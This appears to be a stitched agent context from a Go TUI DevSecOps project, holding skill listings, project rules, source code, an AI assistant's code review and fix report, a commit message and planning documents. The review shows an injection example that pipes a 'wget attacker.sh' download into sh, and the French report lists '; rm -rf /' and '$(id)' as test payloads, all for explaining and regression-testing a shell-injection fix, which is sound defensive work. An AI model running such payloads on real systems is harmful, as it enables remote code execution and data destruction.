- dataviz: Use this skill whenever you are about to create ANY chart, graph, plot, dashboard, or data visualization, in ANY output medium — an HTML or React artifact, inline SVG, plotting code in any library (matplotlib, plotly, d3, Recharts, …), an image/PNG you will render and upload, or a chart shared into Slack. Produces visualizations that read as one system — elegant, accessible, consistent in light and dark — using a brand-neutral placeholder palette you swap for your own. A validated default palette is documented in `references/palette.md` — swap that file's values for your brand's. Triggers on: "chart", "graph", "plot", "data viz", "visualization", "dashboard", "analytics", "visualize data", "categorical colors", "sequential / diverging palette", "stat tile", "sparkline", "heatmap", "legend", "axis", "tooltip", "chart colors", "color by series".

Serves this user's live capability roster and the typed call definitions. Load it whenever the user asks for an artifact needing any such runtime behavior.
- update-config: Use this skill to configure the Claude Code harness via settings.json. Automated behaviors ("from now on when X", "each time X", "whenever X", "before/after X") require hooks configured in settings.json - the harness executes these, not Claude, so memory/preferences cannot fulfill them. Also use for: permissions ("allow X", "add permission", "move permission to"), env vars ("set X=Y"), hook troubleshooting, or any changes to settings.json/settings.local.json files. Examples: "allow npm commands", "add bq permission to global settings", "move permission to user settings", "set DEBUG=true", "when claude stops show X". For simple settings like theme/model, suggest the /config command.
- keybindings-help: Use when the user wants to customize keyboard shortcuts, rebind keys, add chord bindings, or modify ~/.claude/keybindings.json. Examples: "rebind ctrl+s", "add a chord shortcut", "change the submit key", "customize keybindings".
- simplify: Review the changed code for reuse, simplification, efficiency, and altitude cleanups, then apply the fixes. Quality only — it does not hunt for bugs; use /code-review for that.
- fewer-permission-prompts: Scan your transcripts for common read-only Bash and MCP tool calls, then add a prioritized allowlist to project .claude/settings.json to reduce permission prompts.
- loop: Run a prompt or slash command on a recurring interval (e.g. /loop 5m /foo). Omit the interval to let the model self-pace. - When the user wants to set up a recurring task, poll for status, or run something repeatedly on an interval (e.g. "check the deploy every 5 minutes", "keep running /babysit-prs"). Do NOT invoke for one-off tasks.
- schedule: Create, update, list, or run scheduled cloud agents (routines) that execute on a cron schedule. - When the user wants to schedule a recurring cloud agent, set up automated tasks, create a cron job for Claude Code, or manage their scheduled agents/routines. Also use when the user wants a one-time scheduled run ("run this once at 3pm", "remind me to check X tomorrow").
- claude-api: Reference for the Claude API / Anthropic SDK — model ids, pricing, params, streaming, tool use, MCP, agents, caching, token counting, model migration.
TRIGGER — read BEFORE opening the target file; don't skip because it "looks like a one-liner" — whenever: the prompt names Claude/Anthropic in any form (Claude, Anthropic, Fable, Opus, Sonnet, Haiku, `anthropic`, `@anthropic-ai`, `claude-*`, `us.anthropic.*`, `[1m]`); the user asks about an LLM (pricing/model choice/limits/caching) — never answer from memory; OR the task is LLM-shaped with provider unstated (agent/MCP/tool-definition/multi-agent/RAG/LLM-judge/computer-use; generate/summarize/extract/classify/rewrite/converse over NL; debugging refusals/cutoffs/streaming/tool-calls/tokens).
SKIP only when another provider is being worked on (overrides all triggers): OpenAI/GPT/Gemini/Llama/Mistral/Cohere/Ollama named in the query; OR `grep -rE 'openai|langchain_openai|google.generativeai|genai|mistralai|cohere|ollama'` over the project hits (run this grep FIRST if no provider named — don't Read the file).

# Project Context for AI Agents

_This file contains critical rules and patterns that AI agents must follow when implementing code in this project. Focus on unobvious details that agents might otherwise miss._

---

## AI Collaboration Rules

> [!IMPORTANT]
> This project uses a hybrid AI collaboration model:
> - **Planning, Research, Brainstorming, Requirements, and Spec Engineering**: Use **Gemini** (or Antigravity).
> - **Implementation, Code Writing, and Fixes**: Use **Claude Code**.
> - **Plan Location**: All implementation plans MUST be saved in the `.claude/plans/` directory to be accessible by Claude Code.

---

## Technology Stack & Versions

- **Language**: Go 1.25.5
- **TUI Framework**: Bubble Tea (github.com/charmbracelet/bubbletea v1.3.10)
- **UI Components**: Bubbles (github.com/charmbracelet/bubbles v0.21.0)
- **Styling**: Lipgloss (github.com/charmbracelet/lipgloss v1.1.0)
- **API Clients**: GitLab API (gitlab.com/gitlab-org/api/client-go v1.10.0)
- **Security Tools**: Trivy, Gitleaks
- **Containerization**: Docker (Podman support is currently premature and should be removed)

---

## Critical Implementation Rules

1.  **Architecture**: Multi-view TUI using a central Router (`internal/app/app.go`).
2.  **State Management**: Follow the Elm Architecture (TEA). **NEVER** modify model state inside a `Cmd`.
3.  **Styling**: Use the centralized `internal/ui/theme` package for all styles and colors.
4.  **Keybindings**: Follow standardized keybindings defined in `.claude/rules/tui.md`.
    - `ctrl+d`: Delete
    - `ctrl+s`: Scan
    - `.`: Cycle sorting
    - `hjkl`: Navigation
5.  **Documentation**: Keep `GetHelpContent()` synchronized with changes.

1	package main
2	
3	import (
4		"fmt"
5		"log"
6		"os"
7	
8		tea "github.com/charmbracelet/bubbletea"
9		"gitlab.com/anthnell/devsecops/devdesk/internal/app"
10		"gitlab.com/anthnell/devsecops/devdesk/internal/config"
11		"gitlab.com/anthnell/devsecops/devdesk/internal/ui/theme"
12	)
13	
14	func getCurrentContextName() string {
15		ctx, err := config.GetCurrentContext()
16		if err != nil || ctx == "" {
17			return "default"
18		}
19		return ctx
20	}
21	
22	func main() {
23		// Forcer TrueColor si Windows Terminal est détecté (WSL ne propage pas COLORTERM)
24		if os.Getenv("WT_SESSION") != "" && os.Getenv("COLORTERM") == "" {
25			_ = os.Setenv("COLORTERM", "truecolor")
26		}
27	
28		// Charger la configuration
29		cfg, err := config.Load()
30		if err != nil {
31			fmt.Printf("Error loading config: %v\n", err)
32			fmt.Println("Using default configuration.")
33			cfg = config.Default()
34		}
35	
36		// Créer le répertoire de config s'il n'existe pas
37		if err := config.EnsureConfigDir(); err != nil {
38			fmt.Printf("Warning: Could not create config directory: %v\n", err)
39		}
40	
41		// Toujours activer le logging dans un fichier pour éviter de polluer l'interface TUI
42		logFile, err := tea.LogToFile(cfg.App.LogFile, "debug")
43		if err != nil {
44			fmt.Printf("Warning: Could not create log file: %v\n", err)
45		} else {
46			defer func() { _ = logFile.Close() }()
47			log.Printf("=== DevDesk Started ===")
48			log.Printf("Config loaded from context: %s", getCurrentContextName())
49			log.Printf("Log file: %s", cfg.App.LogFile)
50			log.Printf("DEBUG mode: %v", len(os.Getenv("DEBUG")) > 0)
51		}
52	
53		// Charger et appliquer le thème sauvegardé
54		if cfg.App.Theme != "" && cfg.App.Theme != "dark" {
55			t, err := theme.LoadTheme(cfg.App.Theme)
56			if err != nil {
57				log.Printf("Warning: Could not load theme '%s': %v, using default", cfg.App.Theme, err)
58			} else {
59				theme.ApplyTheme(t)
60				theme.CurrentThemeName = cfg.App.Theme
61				log.Printf("Theme loaded: %s", cfg.App.Theme)
62			}
63		}
64	
65		// Créer l'application avec le router
66		m := app.New(cfg)
67	
68		// Options du programme Bubble Tea
69		opts := []tea.ProgramOption{
70			tea.WithAltScreen(), // Mode plein écran
71		}
72	
73		// Lancer le programme Bubble Tea
74		p := tea.NewProgram(m, opts...)
75	
76		if _, err := p.Run(); err != nil {
77			fmt.Printf("Error running application: %v\n", err)
78			os.Exit(1)
79		}
80	}

# Idées de Fonctionnalités (Brainstorming)

## 1. 🕸️ Gestion et Diagnostic Réseau Avancés
- [x] **Visualisation topologique :** Un écran montrant quels conteneurs communiquent sur quels réseaux Docker pré-existants.
- [x] **Ping/Curl inter-conteneurs :** Une interface permettant d'exécuter rapidement un test de connectivité (ex: "Depuis *Conteneur A*, fais une requête HTTP vers *Conteneur B* : port 8080") sans avoir à ouvrir un shell manuellement.
- [ ] **Gestionnaire de "Port Forwarding" :** Un tableau de bord interactif pour gérer les redirections de ports vers la machine hôte.

## 2. 🛡️ Remédiation Sécurité Interactive (DevSecOps)
- [ ] **Assistance à la mise à jour (Auto-Patch) :** Après le scan Trivy, proposer de générer automatiquement un patch ou un `Dockerfile` mis à jour changeant la version de l'image de base pour corriger les CVE critiques.
- [ ] **Scan au niveau du code (SAST local) :** Intégrer des outils de linting de sécurité (comme `gitleaks` pour les secrets ou des linters IaC) directement dans la vue "Workspace".

## 3. 📉 Analyseur de Build et de Cache OCI
- [ ] **Visualisation des calques (Layers) :** Analyser une image locale pour afficher la taille de chaque couche (à la manière de l'outil `dive`).
  - Implémentation intégrée via `google/go-containerregistry` (approche "daemonless" sans dépendance au démon Docker).
  - Interaction directe avec les registres OCI (pull des manifestes et configs sans télécharger l'image entière).
  - Lecture en streaming des calques en mémoire (format `tar`) pour recréer l'arborescence des fichiers système.
  - Calcul de l'espace gaspillé via la détection des fichiers whiteouts (`.wh.`).
- [ ] **Analyse de "Cache Miss" :** Indiquer pourquoi la mise en cache d'un build a échoué (ex: "Le fichier package.json a été modifié, invalidant le cache").

## 4. 🚀 "Injection" d'Environnement (Dev Containers Spontanés)
- [ ] **Injection de configuration :** Permettre d'injecter les dotfiles du développeur (configuration vim, zsh, alias) dynamiquement lors de l'ouverture d'un terminal dans un conteneur.
- [ ] **Montage de volume "à chaud" :** Ajouter la possibilité de monter le répertoire de travail actuel (`pwd`) dans un conteneur existant à la volée pour tester un script local sans avoir à rebuild l'image.

## 5. 📊 Tableau de bord des Ressources (Mini-htop intégré)
- [ ] **Graphiques TUI :** Une vue avec des graphiques en TUI (utilisant des caractères braille) représentant l'utilisation en temps réel du CPU, de la RAM et des I/O réseau pour tous les conteneurs du projet sélectionné.
- [ ] **Alertes visuelles :** Possibilité de définir des alertes visuelles (ex: saturation mémoire).

content.text:
Analysis complete. Here's what I found.

## What it is

**DevDesk** — a Go/Bubble Tea TUI "DevSecOps cockpit", 33,232 lines across 103 Go files in 28 packages. Nine views (dashboard, status, GitLab auth/explorer, workspaces, security, containers, OCI resources, netdiag) behind a central router in `internal/app/app.go:56`, driven by a vim-style `:` command mode.

Most functionality is delegated to external binaries: `docker` (88 `exec.Command` call sites), Trivy, Gitleaks, plus the GitLab API client. Ephemeral containers are the execution substrate for network diagnostics.

## Health checks — all green

```
go build ./...        ✅
go vet ./...          ✅
golangci-lint run     ✅  0 issues
go test ./...         ✅  all pass
```

Rule compliance is genuinely good where it's mechanically checkable: zero hardcoded hex outside `theme/colors.go`, zero `lipgloss.Join*` calls, no `bubbles/textarea`, no `style.Render()` inside `table.Row{}`. Rule 110 also holds — Cmd closures consistently capture locals (`capturedOpts`, `capturedName` at `internal/ui/security/model.go:693`) rather than touching the model.

## Problems worth acting on

**1. The repo has zero commits.** `git log` → *"your current branch 'main' does not have any commits yet"*. All 33k lines are untracked, no remote configured. One `rm -rf` from total loss.

**2. Test coverage is bimodal and mostly absent.**

| Tested | | Untested |
|---|---|---|
| `command` | 89.7% | all 14 `ui/*` packages — 0% |
| `config` | 88.7% | `docker` — 4.0% |
| `theme` | 78.9% | `app` — 6.6% |
| `cache` | 71.3% | `gitlab` — 7.5% |
| `status` | 64.8% | `scan` — 10.3% |

Roughly 20k of 33k lines have no test. Your own rule mandates 80%. Also: `go test -race` **cannot run here** — `CGO_ENABLED=0` and no C toolchain, so the race-detector requirement in `.claude/rules/code-quality.md` is currently unenforceable.

**3. Shell injection in `RunSSLCert`** — `internal/docker/netdiag.go:91`

```go
shellCmd := fmt.Sprintf(`echo | openssl s_client ... -servername %s -connect %s ...`, target, connect)
return runDiagHost(image, []string{"/bin/sh", "-c", shellCmd})
```

`target` comes straight from the netdiag form (`internal/ui/netdiag/model.go:535`), validated only for non-emptiness. A target of `x; wget attacker.sh -O-|sh` executes in a container running `--network host`. Every sibling function (`RunPing`, `RunNetcat`, `RunCurl`) correctly uses argv — this is the lone `sh -c` one. Fix: drop the `grep` pipe and parse output in Go, or validate `target` against `isIPAddress`/hostname rules (the helper already exists at `model.go:135`).

**4. Privileged host-namespace containers.** `RunSS` and `KillProcess` (`internal/docker/network.go:25,62`) run `--privileged --pid=host --net=host`. `kill -9` therefore targets **host** PIDs, from a TUI table row behind `ctrl+k`. The argv is safe; the capability is the risk — worth a confirmation modal, if there isn't one.

**5. No platform abstraction.** Zero build-tag files. `internal/ui/netdiag/model.go:143` opens `/etc/resolv.conf` unconditionally; `network.go:38-40` bind-mounts `/etc/resolv.conf`, `/etc/hosts`, `/etc/nsswitch.conf`. `--net=host` doesn't behave the same on Docker Desktop. `runtime.GOOS` is checked in 7 spots, but only for opening editors/terminals — never for the Docker layer. Your `todo.md:28` already points at a `platform_compatibility_improvements.md` plan, so this is known.

**6. Nine files exceed the 800-line ceiling** from `.claude/rules/coding-style`: `ui/security/model.go` (1985), `ui/oci_resources/update.go` (1698), `app/app.go` (1549), `gitlab/explorer/model.go` (1403), `ui/workspaces/model.go` (1299), `docker/client.go` (1176), `ui/netdiag/model.go` (1047), plus two more.

**7. Codemaps drifted.** `docs/CODEMAPS/INDEX.md` claims "~31,000 LOC across 97 Go files"; actual is 33,232 across 103. Dated 2026-03-28.

## Suggested order

1. `git add . && git commit` — then push somewhere. Everything else is moot until this is done.
2. Patch `RunSSLCert`.
3. Set `CGO_ENABLED=1` + a C toolchain so `-race` actually runs, given TEA concurrency is a core project rule.
4. Backfill tests on `docker` and `scan` (pure parsers like `parseSSOutput` are cheap wins), then the view `Update()` functions.

Want me to fix the injection and get the repo committed?

23	// Init initializes the containers view
24	func (m Model) Init() tea.Cmd {
25		return tea.Batch(

27			tickCmd(),
28			fetchContainers(m.showAll),
29		)
30	}

32	// Update handles messages
33	func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
34		switch msg := msg.(type) {
35		case tea.WindowSizeMsg:
36			m.resize(msg.Width, msg.Height)
37			return m, nil
38	
39		case tea.KeyMsg:
40			return m.handleKeyMsg(msg)
41	
42		case spinner.TickMsg:
43			if m.loading || m.logsLoading {
44				var cmd tea.Cmd
45				m.spinner, cmd = m.spinner.Update(msg)
46				return m, cmd
47			}
48	
49		case RefreshTickMsg:
50			return m, tea.Batch(fetchContainers(m.showAll), fetchMetrics())
51	
52		case ContainersListMsg:
53			return m.handleContainersList(msg)
54	
55		case ContainerMetricsMsg:
56			return m.handleContainerMetrics(msg)
57	
58		case ContainerActionMsg:
59			return m.handleContainerAction(msg)
60	
61		case ContainerLogsLoadedMsg:
62			return m.handleContainerLogsLoaded(msg)
63	
64		case PagerExitMsg:
65			if m.state == stateLogs {
66				// Reload logs on return from follow or external pager
67				m.logsLoading = true
68				return m, tea.Batch(m.spinner.Tick, fetchContainerLogs(m.logsContainerID, m.logsTimestamps))
69			}
70			return m, tea.Batch(tickCmd(), fetchContainers(m.showAll))
71	
72		case sharedcomponents.ConfirmModalYesMsg:
73			return m.handleConfirmYes()
74	
75		case sharedcomponents.ConfirmModalNoMsg:
76			m.confirmModal = nil
77			m.pendingAction = ""
78			return m, nil
79	
80		case ContainerPruneMsg:
81			return m.handlePruneComplete(msg)
82	
83		case ShellWindowOpenedMsg:
84			if msg.Err != nil {
85				log.Printf("ERROR [containers] open shell window: %v", msg.Err)
86				m.errorMsg = "Failed to open terminal — check logs"
87			}
88			return m, nil
89		}
90	
91		// Update table if no modal active and in table state
92		if m.state == stateTable && m.confirmModal == nil && !m.filterBar.InEditMode() {
93			var cmd tea.Cmd
94			m.containerTable, cmd = m.containerTable.Update(msg)
95			m.refreshSelectionStyle()
96			return m, cmd
97		}
98	
99		return m, nil
100	}

102	// handleKeyMsg processes keyboard input with priority chain
103	func (m Model) handleKeyMsg(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
104		// Priority 1: logs view
105		if m.state == stateLogs {
106			return m.handleLogsKeyMsg(msg)
107		}
108	
109		// Priority 2: confirm modal
110		if m.confirmModal != nil {
111			var cmd tea.Cmd
112			m.confirmModal, cmd = m.confirmModal.Update(msg)
113			return m, cmd
114		}
115	
116		// Priority 3: filter input active
117		if m.filterBar.InEditMode() {
118			return m.handleFilterKeyMsg(msg)
119		}
120	
121		// Priority 4: normal mode
122		return m.handleNormalKeyMsg(msg)
123	}

125	// handleLogsKeyMsg handles keys when the internal logs viewport is active
126	func (m Model) handleLogsKeyMsg(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
127		switch msg.String() {
128		case "esc", "q":

137		case "f":

142		case "up", "k":

146		case "pgup":

154		}
155		return m, nil
156	}

159	func (m Model) handleFilterKeyMsg(msg tea.KeyMsg) (tea.Model, tea.Cmd) {

chore: initial commit

Import of DevDesk, a Bubble Tea TUI for DevSecOps workflows: system status
monitoring, GitLab integration, Trivy/Gitleaks scanning, Docker and OCI
resource management, and network diagnostics.

Includes security hardening applied at import time:

- RunSSLCert built its shell pipeline with fmt.Sprintf, interpolating the
  user-supplied target and port directly into a "sh -c" string executed in a
  container running --network host. A target such as `example.com; wget ...`
  broke out of the intended command. The target and port are now passed as
  positional arguments ("sh -c <script> sh <target> <port>"), so the shell
  never parses them as script text.

- netdiag now validates the target (IP address or RFC 1035 hostname) and the
  port (1-65535) before any test runs, rejecting shell metacharacters at the
  form boundary rather than relying on the callee.

- The container log and inspect pagers embed a container ID in a host shell
  command line. Both now verify the ID is hexadecimal via docker.IsContainerID
  before building the command.

Table-driven tests cover the new validators, including the injection payloads
that motivated the change.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>
EOF
echo "=== RESULT ===" && git log --stat --oneline | head -5 && echo "..." && git status --porcelain | wc -l && echo "files still uncommitted"

Corrections terminées. Voici ce qui a été fait — et ce qui reste.

## Corrigé

**1. Injection shell dans `RunSSLCert`** — `internal/docker/netdiag.go:90`

Le `fmt.Sprintf` qui construisait le pipeline est remplacé par un passage en arguments positionnels :

```go
const sslCertScript = `... -servername "$1" -connect "$1:$2" ...`
runDiagHost(image, []string{"/bin/sh", "-c", sslCertScript, "sh", target, port})
```

Le shell reçoit `target` et `port` comme argv — il ne les parse jamais comme du texte de script. Le pipeline `openssl | openssl | grep` est conservé tel quel (un seul run de conteneur).

**2. Validation des entrées netdiag** — `internal/ui/netdiag/model.go`

`validateTarget()` (IP via `net.ParseIP`, ou hostname RFC 1035) et `validatePort()` (1–65535) sont appelés en tête de `startTests()`. Les métacaractères sont rejetés à la frontière du formulaire, avec un message footer clair au lieu d'une sortie conteneur incompréhensible. La duplication `target`/`port` plus bas dans la fonction a été supprimée, et `"443"` est devenu la constante `defaultPort`.

**3. Durcissement des pagers** — `internal/docker/identifier.go` (nouveau) + `internal/ui/containers/update.go:370,478`

`docker.IsContainerID()` vérifie hex 12–64 caractères. Les deux pagers (`docker logs` et `docker inspect`, qui interpolent un ID dans un shell **hôte**) refusent maintenant un ID malformé. Ce n'était pas exploitable en pratique — les IDs viennent de `docker ps` — mais c'était le même anti-pattern.

**4. Tests** — 2 fichiers, 4 fonctions table-driven, incluant les payloads d'injection (`; rm -rf /`, `$(id)`, backticks, newline, échappement de quote) comme cas de non-régression. `internal/ui/netdiag` passe de 0 à un premier fichier de test.

**5. Tâches `test-race` / `cover`** — `mise.toml` + `Makefile`. `CGO_ENABLED=1` est désormais explicite, avec la dépendance au toolchain C documentée dans la description.

**6. Codemaps rafraîchis** — 97 fichiers/~31k LOC → 105/~33k, date au 2026-08-01.

**7. Commit initial** — `654b2ba`, arbre de travail propre. J'ai vérifié avant de committer qu'aucun secret ne partait : les seuls hits sont des placeholders (`glpat-xxxxxxxx` dans `auth/model.go:60`).

Vérification finale : `go build` ✅ · `go vet` ✅ · `golangci-lint` 0 issue ✅ · 11 packages de tests passants ✅

## Non corrigé — et pourquoi

- **Couverture globale.** Je n'ai couvert que les validateurs ajoutés. Les 13 autres packages `ui/*` restent à 0 %, `docker` à 5 %. Atteindre les 80 % de ta règle est un chantier en soi, pas un effet de bord de ces correctifs.
- **Race detector.** Aucun gcc/clang sur le PATH — je ne peux pas installer un compilateur C sans ton accord. `make test-race` échouera désormais avec un message explicite plutôt qu'énigmatique.
- **9 fichiers > 800 lignes.** `security/model.go` (1985), `oci_resources/update.go` (1698), `app.go` (1549)… Découper ça touche à l'architecture des vues ; ça mérite un plan dédié, pas un passage en fin de session.
- **Couche Docker non portable.** `--net=host`, `--pid=host` et les montages `/etc/*` supposent un hôte Linux. Ton `.claude/plans/platform_compatibility_improvements.md` couvre déjà le sujet.
- **Pas de remote.** Le dépôt est committé mais reste local — rien à pousser tant que tu n'as pas configuré l'origine GitLab.

Si tu veux enchaîner, le plus rentable est la couverture sur `internal/docker` et `internal/scan` : les parsers y sont purs et testables sans Docker.

content.text:
# Plan Command

This command creates a comprehensive implementation plan before writing any code. It accepts either free-form requirements or a PRD markdown file.

Run inline by default. Do not call the Task tool or any subagent by default. This keeps `/plan` usable from plugin installs that ship commands without agent files.

## What This Command Does

1. **Restate Requirements** - Clarify what needs to be built
2. **Identify Risks** - Surface potential issues and blockers
3. **Create Step Plan** - Break down implementation into phases
4. **Wait for Confirmation** - MUST receive user approval before proceeding

## When to Use

Use `/plan` when:
- Starting a new feature
- Making significant architectural changes
- Working on complex refactoring
- Multiple files/components will be affected
- Requirements are unclear or ambiguous

## How It Works

The assistant will:

1. **Analyze the request** and restate requirements in clear terms
2. **Ground the plan** in relevant codebase patterns when the repo is available
3. **Break down into phases** with specific, actionable steps
4. **Identify dependencies** between components
5. **Assess risks** and potential blockers
6. **Estimate complexity** (High/Medium/Low)
7. **Present the plan** and WAIT for your explicit confirmation

## Input Modes

| Input | Mode | Behavior |
|---|---|---|
| `path/to/name.prd.md` | PRD artifact mode | Read the PRD, pick the next pending delivery milestone or implementation phase, and write `.claude/plans/{name}.plan.md` |
| Any other markdown path | Reference mode | Read the file as context and produce an inline plan |
| Free-form text | Conversational mode | Produce an inline plan |
| Empty input | Clarification mode | Ask what should be planned |

In PRD artifact mode, create `.claude/plans/` if needed. If the PRD contains a `Delivery Milestones` table, update only the selected row from `pending` to `in-progress` and set its `Plan` cell to the generated plan path. If the PRD uses the legacy `.claude/PRPs/prds/` format with `Implementation Phases`, read it without migrating paths.

## Pattern Grounding

Before writing the plan, search the codebase for conventions the implementation should mirror. Capture the top example for each relevant category with file references:

| Category | What to capture |
|---|---|
| Naming | File, function, type, command, or script naming in the affected area |
| Error handling | How failures are raised, returned, logged, or handled gracefully |
| Logging | Levels, format, and what gets logged |
| Data access | Repository, service, query, or filesystem patterns |
| Tests | Test file location, framework, fixtures, and assertion style |

If no similar code exists, state that explicitly. Do not invent a pattern.

## PRD Artifact Output

When called with a `.prd.md` file, write the plan to `.claude/plans/{kebab-case-name}.plan.md` using this structure:

````markdown
# Plan: {Feature Name}

**Source PRD**: {path}
**Selected Milestone**: {milestone or phase name}
**Complexity**: {Small | Medium | Large}

## Summary
{2-3 sentences}

## Patterns to Mirror
| Category | Source | Pattern |
|---|---|---|
| Naming | `path:line` | {short description} |
| Errors | `path:line` | {short description} |
| Tests | `path:line` | {short description} |

## Files to Change
| File | Action | Why |
|---|---|---|
| `path` | CREATE / UPDATE / DELETE | {reason} |

## Tasks
### Task 1: {name}
- **Action**: {what to do}
- **Mirror**: {pattern to follow}
- **Validate**: {command that proves correctness}

## Validation
```bash
{project-specific validation commands}
```

## Risks
| Risk | Likelihood | Mitigation |
|---|---|---|

## Acceptance
- [ ] All tasks complete
- [ ] Validation passes
- [ ] Patterns mirrored, not reinvented
````

After writing the artifact, report its path and WAIT for confirmation before writing code.

## Example Usage

```
User: /plan I need to add real-time notifications when markets resolve

Assistant:
# Implementation Plan: Real-Time Market Resolution Notifications

## Requirements Restatement
- Send notifications to users when markets they're watching resolve
- Support multiple notification channels (in-app, email, webhook)
- Ensure notifications are delivered reliably
- Include market outcome and user's position result

## Implementation Phases

### Phase 1: Database Schema
- Add notifications table with columns: id, user_id, market_id, type, status, created_at
- Add user_notification_preferences table for channel preferences
- Create indexes on user_id and market_id for performance

### Phase 2: Notification Service
- Create notification service in lib/notifications.ts
- Implement notification queue using BullMQ/Redis
- Add retry logic for failed deliveries
- Create notification templates

### Phase 3: Integration Points
- Hook into market resolution logic (when status changes to "resolved")
- Query all users with positions in market
- Enqueue notifications for each user

### Phase 4: Frontend Components
- Create NotificationBell component in header
- Add NotificationList modal
- Implement real-time updates via Supabase subscriptions
- Add notification preferences page

## Dependencies
- Redis (for queue)
- Email service (SendGrid/Resend)
- Supabase real-time subscriptions

## Risks
- HIGH: Email deliverability (SPF/DKIM required)
- MEDIUM: Performance with 1000+ users per market
- MEDIUM: Notification spam if markets resolve frequently
- LOW: Real-time subscription overhead

## Estimated Complexity: MEDIUM
- Backend: 4-6 hours
- Frontend: 3-4 hours
- Testing: 2-3 hours
- Total: 9-13 hours

**WAITING FOR CONFIRMATION**: Proceed with this plan? (yes/no/modify)
```

## Important Notes

**CRITICAL**: This command will **NOT** write any code until you explicitly confirm the plan with "yes" or "proceed" or similar affirmative response.

If you want changes, respond with:
- "modify: [your changes]"
- "different approach: [alternative]"
- "skip phase 2 and do phase 3 first"

## Integration with Other Commands

After planning:
- Use the `tdd-workflow` skill to implement with test-driven development
- Use `/build-fix` if build errors occur
- Use `/code-review` to review completed implementation
- Use `/pr` or `/prp-pr` to open a pull request

> **Need requirements first?** Use `/plan-prd` for a lean PRD at `.claude/prds/{name}.prd.md`.
>
> **Need the legacy PRP flow?** Use `/prp-plan` for deep PRP planning with `.claude/PRPs/` artifacts. Use `/prp-implement` to execute those plans with rigorous validation loops.

## Optional Planner Agent

ECC also provides a `planner` agent for manual installs that include agent files. Use it only when the local runtime already exposes that subagent and the user explicitly asks you to delegate planning.

If the `planner` subagent is unavailable, continue planning inline instead of surfacing an "Agent type 'planner' not found" error.

For manual installs, the source file lives at:
`agents/planner.md`

content.text:
Trois découvertes changent la forme du plan :

- **`make` n'est pas installé** sur cette machine — le Makefile documenté dans `README.md` et `.claude/CLAUDE.md` est déjà inutilisable ici. La migration régularise l'existant plutôt qu'elle ne casse quelque chose.
- **mise exécute les tâches via `cmd /c` sur Windows** (`windows_default_inline_shell_args` = `cmd /c`). Deux tâches actuelles sont donc cassées : `clean` (`rm -rf bin`) et `run` (`./bin/dk`).
- **Aucun fichier CI** dans le dépôt (ni `.gitlab-ci.yml`, ni Dockerfile) — rien à migrer côté pipeline.

---

# Plan d'implémentation : migration Makefile → mise

## Reformulation du besoin

Faire de `mise.toml` la source unique de vérité pour les tâches de développement, supprimer le `Makefile`, et aligner toute la documentation. La migration doit être **sans perte** : aucune capacité présente dans le Makefile ne doit disparaître.

## Analyse d'écart

| Cible | Makefile | mise.toml | Action |
|---|---|---|---|
| `build` `dev` `test` `test-race` `fmt` `vet` `tidy` `deps` `install` | ✅ | ✅ | Aucune |
| `cover` | ✅ | ❌ | **Porter** |
| `lint` `check` | ❌ | ✅ | Aucune (bonus déjà présent) |
| `help` | ✅ (target custom) | natif `mise tasks` | Ne pas porter — documenter |
| `run` | `./bin/dk` | `./bin/dk` | **Corriger** (casse sous `cmd`) |
| `clean` | `rm -rf` + `go clean` | `rm -rf` + `go clean` | **Corriger** (casse sous `cmd`) |
| Echos de progression | ✅ | ❌ | Abandonner (mise affiche déjà `[task] $ cmd`) |
| `VERSION?=dev` | déclarée, **jamais utilisée** | ❌ | **Décision** — voir ci-dessous |

## Points de décision

**1. Variable `VERSION` — code mort.** Elle est déclarée ligne 5 du Makefile et référencée nulle part. Deux options :

- *(recommandé)* La laisser tomber. C'est du code mort ; l'introduire dans mise serait porter une dette.
- La câbler réellement : `go build -ldflags "-X main.version=$VERSION"` + une variable `version` dans `main.go`. C'est une **fonctionnalité nouvelle**, hors périmètre d'une migration — à traiter séparément si tu la veux.

Je pars sur l'abandon, sauf indication contraire.

**2. Shell des tâches sous Windows.** Pour que `clean` et `run` fonctionnent partout, deux approches :

- *(recommandé)* Forcer un shell POSIX : `[settings] windows_default_inline_shell_args = "bash -c"` dans `mise.toml`. Cohérent avec le reste du projet, qui suppose déjà des sémantiques POSIX (Docker `--net=host`, montages `/etc/*`). Git Bash est présent sur cette machine.
- Rendre chaque tâche cross-platform (`go clean -cache` au lieu de `rm -rf`, chemins sans `./`). Plus portable, mais plus verbeux et ça ne règle pas le problème de fond.

**3. Suppression du Makefile.** Je le supprime — c'est l'objet de la demande. Si tu veux une transition douce pour d'éventuels collaborateurs, on peut garder un Makefile de 3 lignes qui délègue à mise ; dis-le et je l'ajoute.

## Phases

### Phase 1 — Combler les écarts dans `mise.toml`
- Ajouter `[settings] windows_default_inline_shell_args = "bash -c"`.
- Ajouter la tâche `cover` (`go test -cover ./...`).
- Corriger `run` : `bin/dk` sans préfixe `./`, ou passer par un `depends` + exécution directe.
- Vérifier `clean` sous le nouveau shell.
- Aligner `[tools] go = "1.25"` sur le `go 1.25.5` de `go.mod` — décider si on épingle le patch.

### Phase 2 — Valider chaque tâche réellement
Exécuter les 14 tâches une par une et constater le résultat. Pas de « ça devrait marcher » : `clean` et `run` sont précisément celles qui échouent aujourd'hui.

### Phase 3 — Supprimer le Makefile
`git rm Makefile`, une fois la phase 2 verte.

### Phase 4 — Documentation
| Fichier | Occurrences | Action |
|---|---|---|
| `README.md` | l.37, 40, 47, 129-134, 209 | Remplacer `make X` → `mise run X` ; retirer `Makefile` de l'arborescence l.209 |
| `.claude/CLAUDE.md` | l.27, 31-32, 35, 41-43, 47 | Idem, dans le bloc « Build and Development Commands » |
| `docs/CODEMAPS/dependencies.md` | section build tools | Vérifier et corriger si le Makefile y est listé |

Ajouter une ligne sur `mise tasks` comme remplaçant de `make help`.

### Phase 5 — Commit
Un seul commit `chore:` couvrant config + docs + suppression, pour que la migration soit atomique et révocable.

## Validation

```bash
mise tasks                    # les 14 tâches listées, descriptions correctes
mise run build && ls bin/dk   # binaire produit
mise run clean && ! test -d bin   # nettoyage effectif (cassé aujourd'hui)
mise run check                # fmt + vet + lint + test en chaîne
mise run cover                # nouvelle tâche
grep -rn "make " README.md .claude/CLAUDE.md   # doit ne rien retourner
git status --porcelain        # arbre propre après commit
```

## Risques

| Risque | Probabilité | Mitigation |
|---|---|---|
| `bash -c` indisponible sur une machine Windows sans Git Bash | Moyenne | Documenter le prérequis dans le README ; Git Bash est présent ici |
